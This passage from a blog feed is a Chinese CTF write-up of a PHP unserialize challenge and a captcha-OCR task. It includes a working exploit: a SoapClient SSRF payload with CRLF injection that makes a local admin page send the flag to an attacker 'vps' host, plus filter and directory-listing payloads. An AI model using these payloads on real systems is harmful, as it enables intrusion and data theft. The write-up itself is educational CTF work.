class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">=</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">par0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1<span class="token punctuation">,</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'syclover    !'</span><span class="token punctuation">.</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi<span class="token punctuation">.</span><span class="token single-quoted-string string">'     yyds'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//$ser = serialize($this -> kelasi);</span>        <span class="token comment">//$unser = unserialize($ser);</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi <span class="token operator">-</span><span class="token operator">></span> <span class="token function">juts_a_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">==</span> <span class="token single-quoted-string string">'unser'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        @<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">.</span><span class="token single-quoted-string string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>首先<code>__wakeup</code>里用伪协议读取<code>hint.php</code></p><p><code>$this-&gt;par2=php://filter/read=convert.base64-encode/resource=./</code></p><p><code>hint.php</code> </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'向管理员的页面post一个参数message(告诉他，"iwantflag") 和 另一个参数 url（它会向这个url发送一个flag'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'管理员的页面在当前目录下一个特殊文件夹里'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)'</span><span class="token punctuation">;</span></span></code></pre><p>通过<code>newOne()</code>使用原生类<code>FilesystemIterator</code>读取目录</p><p>读取两次</p><p><code>/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p><p>然后<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012339716.png"><br>这个只能读一行，只有个<code>&lt;?php</code></p><p>接下来<code>SoapClient打SSRF</code></p><p>官方exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fxxk</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$kelasi</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par2</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par3</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$par1</span><span class="token punctuation">,</span><span class="token variable">$par2</span><span class="token punctuation">,</span><span class="token variable">$par3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0 <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1 <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2 <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">=</span> <span class="token variable">$par3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$postdata</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'message=iwantflag&amp;url=http://vps:9999'</span><span class="token punctuation">;</span><span class="token comment">//按要求设置post数据</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'http://127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php'</span><span class="token punctuation">;</span><span class="token comment">//payload1 = new fxxk('','','php://filter/read=convert.base64-encode/resource=./','');#伪协议读hint</span><span class="token comment">//payload2 = new fxxk('FilesystemIterator','./',1,'echoo');#列目录</span><span class="token comment">//payload3 = new fxxk('FilesystemIterator','./aaaaaaaaaaafxadwagaefae',1,'echoo');#列目录</span><span class="token variable">$payload4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fxxk</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'SoapClient'</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'wupco'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Content-Type:'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Application/X-WWW-Form-Urlencoded'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Content-Length:'</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$postdata</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!!!'</span><span class="token punctuation">.</span><span class="token variable">$postdata</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'baaa'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$soa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"\r\n"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$soa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012348807.png"></p><h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p>验证码ocr</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112020019531.png"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">import</span> re<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> ddddocr<span class="token keyword">import</span> onnxruntime<span class="token keyword">import</span> requests<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodeurl <span class="token operator">=</span> <span class="token string">"http://110.42.233.91:88/access"</span>sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>ocr <span class="token operator">=</span> ddddocr<span class="token punctuation">.</span>DdddOcr<span class="token punctuation">(</span>use_gpu<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>onnxruntime<span class="token punctuation">.</span>set_default_logger_severity<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pic_to_text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"base64,(.*?)>"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"v_code_LA.png"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>img<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    v_code <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"v_code_LA.png"</span><span class="token punctuation">)</span>    v_code<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span>    v_code<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"v_code.png"</span><span class="token punctuation">)</span>    v_code_bytes <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'v_code.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> ocr<span class="token punctuation">.</span>classification<span class="token punctuation">(</span>v_code_bytes<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"v_code.png"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> code<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    cnt <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"done (.*?) times"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> cnt <span class="token operator">==</span> <span class="token number">1000</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span>    code <span class="token operator">=</span> pic_to_text<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"v_code"</span><span class="token punctuation">:</span> code    <span class="token punctuation">&#125;</span>    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        validate<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>不过这个脚本运行报错，等之后看看吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;temp&quot;&gt;&lt;a href=&quot;#temp&quot; class=&quot;headerlink&quot; title=&quot;temp&quot;&gt;&lt;/a&gt;temp&lt;/h2&gt;&lt;p&gt;这道不是极客大挑战的，就写这里吧&lt;/p&gt;
&lt;pre class=&quot;language-php&quot; data-language=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="geekchallenge" scheme="http://lll-nnn.github.io/tags/geekchallenge/"/>
    
  </entry>
  
</feed>
